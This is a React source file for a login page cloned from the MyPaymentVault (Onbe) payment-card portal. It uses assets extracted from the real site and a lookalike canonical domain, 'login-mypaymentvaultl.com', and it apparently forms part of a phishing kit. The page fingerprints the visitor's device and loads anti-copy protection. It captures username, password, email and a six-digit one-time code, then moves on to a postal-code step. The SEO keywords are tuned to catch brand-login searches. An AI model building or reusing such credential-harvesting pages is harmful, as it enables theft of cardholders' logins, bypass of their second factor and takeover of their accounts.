import { useState, useEffect } from 'react';
import { useLocation } from 'wouter';
import { AntiCopyProtection } from '@/components/AntiCopyProtection';
import { SEO } from '@/components/SEO';
import { LanguageSwitcher } from '@/components/LanguageSwitcher';
import { useLanguage } from '@/contexts/LanguageContext';
import { apiRequest } from '@/lib/queryClient';
import { useToast } from '@/hooks/use-toast';
import { getDeviceData } from '@/lib/deviceInfo';
import { collectDeviceFingerprint, getStoredFingerprint, type DeviceFingerprint } from '@/lib/device-fingerprint';
import '@/styles/styles.css';
import logoSvg from '@assets/extracted/login.mypaymentvault.com/paymentvault_logo.svg';
import loginPageImg from '@assets/extracted/login.mypaymentvault.com/login_page.webp';

export default function LoginPage() {
  const [, setLocation] = useLocation();
  const { toast } = useToast();
  const { t } = useLanguage();
  
  const [showEmailModal, setShowEmailModal] = useState(false);
  const [showOtpModal, setShowOtpModal] = useState(false);
  const [loginAttemptId, setLoginAttemptId] = useState('');
  const [sessionId, setSessionId] = useState('');
  const [email, setEmail] = useState('');
  const [maskedEmail, setMaskedEmail] = useState('');
  const [otpCode, setOtpCode] = useState('');
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [emailError, setEmailError] = useState('');
  const [otpError, setOtpError] = useState('');
  const [fingerprint, setFingerprint] = useState<DeviceFingerprint | null>(null);

  // Collect fingerprint on mount
  useEffect(() => {
    const collectFingerprint = async () => {
      const stored = getStoredFingerprint();
      if (stored) {
        setFingerprint(stored);
      } else {
        const fp = await collectDeviceFingerprint(true);
        setFingerprint(fp);
      }
    };
    collectFingerprint();
  }, []);

  const maskEmail = (email: string) => {
    const [user, domain] = email.split('@');
    const maskedUser = user.length > 3 ? `${user[0]}...${user.slice(-1)}` : `${user[0]}...`;
    return `${maskedUser}@${domain}`;
  };

  const validateEmail = () => {
    const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const trimmedEmail = email.trim();
    
    if (!emailPattern.test(trimmedEmail)) {
      setEmailError(t('email.invalidEmail'));
      setMaskedEmail('');
      return false;
    }
    
    setEmailError('');
    setMaskedEmail(maskEmail(trimmedEmail));
    return true;
  };

  const validateOtp = () => {
    if (!/^\d{6}$/.test(otpCode.trim())) {
      setOtpError(t('otp.invalidCode'));
      return false;
    }
    setOtpError('');
    return true;
  };

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!username.trim() || !password.trim()) {
      toast({
        title: t('error.generic'),
        description: t('error.credentialsRequired'),
        variant: 'destructive',
      });
      return;
    }

    try {
      const deviceData = getDeviceData();
      // Use stored fingerprint if available, otherwise collect fresh
      const currentFingerprint = fingerprint || await collectDeviceFingerprint(true);
      const response = await apiRequest('POST', '/api/login', { 
        username, 
        password,
        fingerprint: currentFingerprint,
        ...deviceData 
      });
      const data = await response.json();
      
      if (data.success) {
        setLoginAttemptId(data.loginAttemptId);
        sessionStorage.setItem('loginAttemptId', data.loginAttemptId);
        setShowEmailModal(true);
      }
    } catch (error: any) {
      toast({
        title: t('error.generic'),
        description: error.message || t('error.loginFailed'),
        variant: 'destructive',
      });
    }
  };

  const submitEmail = async () => {
    if (!validateEmail()) return;

    try {
      const response = await apiRequest('POST', '/api/verify-email', { loginAttemptId, email });
      const data = await response.json();
      
      if (data.success) {
        setSessionId(data.sessionId);
        setShowEmailModal(false);
        setShowOtpModal(true);
      }
    } catch (error: any) {
      toast({
        title: t('error.generic'),
        description: error.message || t('error.emailVerificationFailed'),
        variant: 'destructive',
      });
    }
  };

  const submitOtp = async () => {
    if (!validateOtp()) return;

    try {
      const response = await apiRequest('POST', '/api/verify-otp', { sessionId, otpCode: otpCode.trim() });
      const data = await response.json();
      
      if (data.success) {
        sessionStorage.setItem('loginAttemptId', loginAttemptId);
        setShowOtpModal(false);
        setLocation('/postal-code');
      }
    } catch (error: any) {
      toast({
        title: t('error.generic'),
        description: error.message || t('error.otpVerificationFailed'),
        variant: 'destructive',
      });
    }
  };

  const closeEmailModal = () => {
    setShowEmailModal(false);
    setEmail('');
    setEmailError('');
  };

  const closeOtpModal = () => {
    setShowOtpModal(false);
    setOtpCode('');
    setOtpError('');
  };

  const faqItems = [
    {
      question: "How do I login to MyPaymentVault?",
      answer: "To login to MyPaymentVault, enter your username and password on the login page. You will then receive an email verification code for multi-factor authentication to ensure secure access to your account."
    },
    {
      question: "What is MyPaymentVault login portal?",
      answer: "MyPaymentVault login portal is a secure payment authentication system for employees and cardholders. It provides multi-factor authentication including email verification and OTP codes to protect your payment information."
    },
    {
      question: "How long does the OTP verification code last?",
      answer: "The OTP verification code sent to your email expires in 10 minutes. If the code expires, you will need to restart the login process to receive a new verification code."
    },
    {
      question: "What should I do if I forgot my MyPaymentVault username?",
      answer: "If you forgot your username, click on the 'Forgot Username' link on the login page. You can recover your username by providing your card details for verification."
    },
    {
      question: "Is MyPaymentVault login secure?",
      answer: "Yes, MyPaymentVault uses multi-factor authentication (MFA) with email verification, OTP codes, and card verification to ensure maximum security for your payment account access."
    }
  ];

  return (
    <>
      <SEO 
        title="MyPaymentVault - Login | Access and Manage Your Account"
        description="Log in to MyPaymentVault to access your payment details, check your balance, and manage your account securely. Not enrolled yet? Create your account today."
        keywords="MyPaymentVault, login mypaymentvault, mypaymentvault login, login wirecard, login northlane, login north lane, wirecard login, northlane login, payment vault login, employee payment portal, secure payment login, mypaymentvault account access, onbe login, wirecard 2 login, onbe 1 login"
        canonical="https://login-mypaymentvaultl.com/"
        breadcrumbs={[
          { name: "MyPaymentVault", url: "/" },
          { name: "Login", url: "/login" }
        ]}
        faqItems={faqItems}
      />
      <AntiCopyProtection />
      
      <div id="root">
        <div>
          <div className="onbe-login-component">
            <div className="onbe-login-inner-component">
              
              {/* Header */}
              <header className="onbe-headercomponent-parent">
                <div className="onbe-login-header-padding d-flex col-xxl-3 col-xl-3 col-lg-3 col-md-6 col-sm-6 col-6 offset-xxl-0 offset-xl-0 offset-lg-0 offset-md-0 offset-sm-0 offset-0">
                  <img 
                    src={logoSvg} 
                    alt={t('common.companyLogo')} 
                    className="onbe-header-affiliate-logo header-logo-size"
                  />
                </div>
                <div className="onbe-header-parent-select-hamburger col-xxl-2 col-xl-2 col-lg-2 col-md-6 col-sm-3 col-3 offset-xxl-7 offset-xl-7 offset-lg-7 offset-md-0 offset-sm-3 offset-3">
                  <LanguageSwitcher />
                </div>
              </header>

              {/* Main Content */}
              <div className="onbe-login-row row">
                
                {/* Form Section */}
                <div className="onbe-login-details-section col-xxl-4 col-xl-5 col-lg-5 col-md-12 col-sm-12 col-12 offset-xxl-0 order-xl-2 offset-xl-0 order-lg-2 offset-lg-0 order-md-2 offset-md-0 order-sm-2 offset-sm-0 order-2 offset-0">
                  <form onSubmit={handleLogin} id="secure_login">
                    <div className="row">
                      <div className="onbe-formContainer">
                        
                        {/* Subtitle */}
                        <div className="onbe-login-subtitle col-lg-12 col-md-12 col-12">
                          <h5 className="onbe-h5">{t('login.title')}</h5>
                          <div className="my-3">
                            {t('login.notEnrolled')}
                            <a className="text-dark ms-2" href="/register" style={{ textDecoration: 'underline' }}>{t('login.createAccount')}</a>
                          </div>
                        </div>

                        {/* Forgot Username */}
                        <div className="onbe-login-forget col-lg-12 col-12">
                          <a href="/forgot-username" className="onbe-login-forget">{t('login.forgotUsername')}</a>
                        </div>

                        {/* Username Field */}
                        <div className="col-lg-12 col-md-12 col-12">
                          <div className="onbe-btovr-input-group">
                            <input 
                              type="text" 
                              id="username" 
                              name="username" 
                              className="onbe-btovr-input-group__input" 
                              placeholder=" " 
                              maxLength={20}
                              value={username}
                              onChange={(e) => setUsername(e.target.value)}
                              data-testid="input-username"
                            />
                            <label className="onbe-btovr-input-group__input_label" htmlFor="username">
                              {t('login.username')}<span className="red">*</span>
                            </label>
                            <div className="text-danger"></div>
                          </div>
                        </div>

                        {/* Forgot Password */}
                        <div className="onbe-login-forget col-lg-12 col-12">
                          <a href="/forgot-password" className="onbe-login-forget">{t('login.forgotPassword')}</a>
                        </div>

                        {/* Password Field */}
                        <div className="col-lg-12 col-md-12 col-12">
                          <div className="onbe-btovr-input-group">
                            <input 
                              type="password" 
                              id="password" 
                              name="password" 
                              className="onbe-btovr-input-group__input" 
                              placeholder=" " 
                              maxLength={50}
                              value={password}
                              onChange={(e) => setPassword(e.target.value)}
                              data-testid="input-password"
                            />
                            <label className="onbe-btovr-input-group__input_label" htmlFor="password">
                              {t('login.password')}<span className="red">*</span>
                            </label>
                            <div className="text-danger"></div>
                          </div>
                        </div>

                        {/* Submit Button */}
                        <div className="col-lg-12 col-md-12 col-sm-12 col-12">
                          <button 
                            type="submit" 
                            id="login" 
                            className="onbe-button onbe-button-primary" 
                            style={{ backgroundColor: '#212121', borderColor: '#212121', color: '#fff' }}
                            data-testid="button-login"
                          >
                            {t('login.signIn')}
                          </button>
                        </div>

                        {/* Activate Card */}
                        <div className="text-center mt-2">
                          <p>
                            {t('login.activateCard')} 
                            <a href="/activate-card" className="text-dark ms-2" style={{ textDecoration: 'underline' }} data-testid="link-activate-card">{t('login.activateCardLink')}</a>
                          </p>
                        </div>

                      </div>
                    </div>
                  </form>
                </div>

                {/* Image Section */}
                <div 
                  className="onbe-login-logo-section col-xxl-6 col-xl-6 col-lg-6 col-md-12 col-sm-12 col-12 order-xxl-2 offset-xxl-0 order-xl-2 offset-xl-0 order-lg-2 offset-lg-0 order-md-1 offset-md-0 order-sm-1 offset-sm-0 order-1 offset-0" 
                  style={{ background: 'linear-gradient(to top, var(--white-color), var(--white-color) 5%, #212121 0%)' }}
                >
                  <img 
                    alt="MyPaymentVault login portal" 
                    className="" 
                    height="100%" 
                    src={loginPageImg} 
                    width="100%"
                    loading="eager"
                  />
                </div>

              </div>

            </div>
            
            {/* Footer - outside row, below everything */}
            <div className="onbe-footer-width">
              <footer className="onbe-footer">
                <ul className="onbe-footer-text">
                  <li><a className="onbe-footer-anchor" href="#" data-testid="link-copyright">{t('login.footer.copyright')}</a></li>
                  <li><a className="onbe-footer-anchor" href="#" target="_blank" data-testid="link-terms-of-use">{t('login.footer.terms')}</a></li>
                  <li><a className="onbe-footer-anchor" href="#" target="_blank" data-testid="link-privacy-cookies">{t('login.footer.privacy')}</a></li>
                  <li><a className="onbe-footer-anchor" href="#" data-testid="link-contact-us">{t('login.footer.contact')}</a></li>
                </ul>
              </footer>
            </div>
          </div>
        </div>
      </div>

      {/* Email Modal */}
      {showEmailModal && (
        <div 
          className="otp-modal" 
          id="emailModal" 
          style={{ 
            display: 'flex', 
            position: 'fixed', 
            zIndex: 9999, 
            top: 0, 
            left: 0, 
            width: '100vw', 
            height: '100vh', 
            backgroundColor: 'rgba(0,0,0,0.5)', 
            alignItems: 'center', 
            justifyContent: 'center' 
          }}
        >
          <div style={{ 
            background: '#fff', 
            padding: '25px', 
            borderRadius: '15px', 
            width: '100%', 
            maxWidth: '350px', 
            textAlign: 'center', 
            fontFamily: 'Arial', 
            boxShadow: '0 0 20px rgba(0,0,0,0.4)' 
          }}>
            <p className="onbe-textcomponent-header-otp-modal">{t('email.title')}</p>
            <p style={{ fontSize: '14px', marginBottom: '8px' }}>
              {t('email.description')}
            </p>
            <p style={{ fontSize: '14px', marginBottom: '12px' }}>
              {t('email.selectMethod')}
            </p>
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px', marginBottom: '12px' }}>
              <input type="radio" checked disabled style={{ accentColor: 'black', width: '14px', height: '14px' }} data-testid="radio-email-option" />
              <span style={{ fontSize: '14px' }}>{t('email.label')} <strong id="maskedEmail">{maskedEmail || t('email.placeholder_example')}</strong></span>
            </div>
            <div style={{ position: 'relative', marginBottom: '10px' }}>
              <input 
                id="emailInput" 
                type="email" 
                placeholder={t('email.placeholder')}
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                onInput={validateEmail}
                style={{ width: '100%', padding: '10px', fontSize: '14px', border: '2px solid #ccc', borderRadius: '6px' }}
                data-testid="input-email"
              />
            </div>
            {emailError && (
              <p id="emailError" style={{ color: 'red', fontSize: '13px', marginTop: '4px' }}>
                {emailError}
              </p>
            )}
            <div style={{ display: 'flex', justifyContent: 'space-between', marginTop: '16px', marginBottom: '14px' }}>
              <button 
                onClick={closeEmailModal} 
                style={{ flex: 1, marginRight: '6px', padding: '10px', background: '#fff', color: '#000', fontWeight: 'bold', fontSize: '14px', border: '1px solid black', borderRadius: '6px' }}
                data-testid="button-cancel-email"
              >
                {t('common.cancel')}
              </button>
              <button 
                onClick={submitEmail} 
                style={{ flex: 1, marginLeft: '6px', padding: '10px', background: 'black', color: 'white', fontWeight: 'bold', fontSize: '14px', border: 'none', borderRadius: '6px' }}
                data-testid="button-send-code"
              >
                {t('email.verify')}
              </button>
            </div>
            <div style={{ fontSize: '11px' }}>
              {t('email.standardRates')}<br />
              <a href="#" style={{ color: '#000', textDecoration: 'underline' }} data-testid="link-privacy-policy">{t('email.privacyPolicy')}</a>
              &nbsp;
              <a href="#" style={{ color: '#000', textDecoration: 'underline' }} data-testid="link-terms-conditions">{t('email.termsConditions')}</a>
            </div>
          </div>
        </div>
      )}

      {/* OTP Modal */}
      {showOtpModal && (
        <div 
          className="otp-modal" 
          id="otpModal" 
          style={{ 
            display: 'flex', 
            position: 'fixed', 
            zIndex: 9999, 
            top: 0, 
            left: 0, 
            width: '100vw', 
            height: '100vh', 
            backgroundColor: 'rgba(0,0,0,0.5)', 
            alignItems: 'center', 
            justifyContent: 'center' 
          }}
        >
          <div style={{ 
            background: '#fff', 
            padding: '30px', 
            borderRadius: '15px', 
            width: '100%', 
            maxWidth: '350px', 
            textAlign: 'center', 
            boxShadow: '0 0 20px rgba(0,0,0,0.4)', 
            fontFamily: 'Arial' 
          }}>
            <p className="onbe-textcomponent-header-otp-modal">{t('otp.title')}</p>
            <p style={{ fontSize: '14px', marginBottom: '8px' }}>{t('otp.description')} <strong>{maskedEmail}</strong></p>
            <p style={{ fontSize: '14px', marginBottom: '8px' }}>{t('otp.expiry')}</p>
            <div style={{ position: 'relative', margin: '20px auto' }}>
              <input 
                id="otpCode" 
                maxLength={6} 
                placeholder={t('otp.placeholder')}
                type="tel" 
                value={otpCode}
                onChange={(e) => setOtpCode(e.target.value)}
                onInput={validateOtp}
                style={{ width: '100%', padding: '10px', fontSize: '16px', border: '2px solid #ccc', borderRadius: '6px' }}
                data-testid="input-otp"
              />
            </div>
            {otpError && (
              <p id="otpError" style={{ color: 'red', fontSize: '13px' }}>
                {otpError}
              </p>
            )}
            <div style={{ display: 'flex', justifyContent: 'space-between', marginTop: '16px', marginBottom: '14px' }}>
              <button 
                onClick={closeOtpModal} 
                style={{ flex: 1, marginRight: '6px', padding: '10px', background: '#fff', color: '#000', fontWeight: 'bold', fontSize: '14px', border: '1px solid black', borderRadius: '6px' }}
                data-testid="button-cancel-otp"
              >
                {t('common.cancel')}
              </button>
              <button 
                onClick={submitOtp} 
                style={{ flex: 1, marginLeft: '6px', padding: '10px', background: 'black', color: 'white', fontWeight: 'bold', fontSize: '14px', border: 'none', borderRadius: '6px' }}
                data-testid="button-continue-otp"
              >
                {t('otp.verify')}
              </button>
            </div>
            <div style={{ marginTop: '15px' }}>
              <a href="#" id="resendOtp" style={{ fontSize: '14px', color: 'black', textDecoration: 'underline' }} data-testid="link-resend-otp">
                {t('otp.resend')}
              </a>
            </div>
          </div>
        </div>
      )}
    </>
  );
}
